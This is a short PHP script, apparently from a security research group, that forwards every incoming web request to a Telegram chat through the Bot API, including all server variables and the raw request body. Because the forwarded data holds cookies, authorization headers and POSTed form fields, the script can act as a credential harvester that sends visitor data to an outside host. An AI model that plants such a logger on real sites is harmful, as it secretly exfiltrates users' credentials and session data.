<?php

$tokenbot = 'Token Bot'; // Token BOT

$teleid = [

    "id"

]; // Chat ID

class bot_telegram
{

    function log()
    {

        $msg_format = "R&D ICWR Bot Website Log\n\n";
        $msg_format .= "Access Time : " . date("r") . "\n";

        foreach ($_SERVER as $i => $v) {

            $msg_format .= $i . " : " . $v . "\n";

        }

        if (!empty(file_get_contents('php://input'))) {

            $msg_format .= "Client Content : \n\n" . file_get_contents('php://input') . "\n";

        }

        return $msg_format;

    }

    function send_msg_telegram($tokenbot, $teleid, $msg)
    {
    

        foreach ($teleid as $id)
        {

            $data = [

                'text' => $msg,
                'chat_id' => $id

            ];

            file_get_contents("https://api.telegram.org/bot$tokenbot/sendMessage?" . http_build_query($data));

        }

    }

}

$func = New bot_telegram();
$msg = $func->log();
$result = $func->send_msg_telegram($tokenbot, $teleid, $msg);
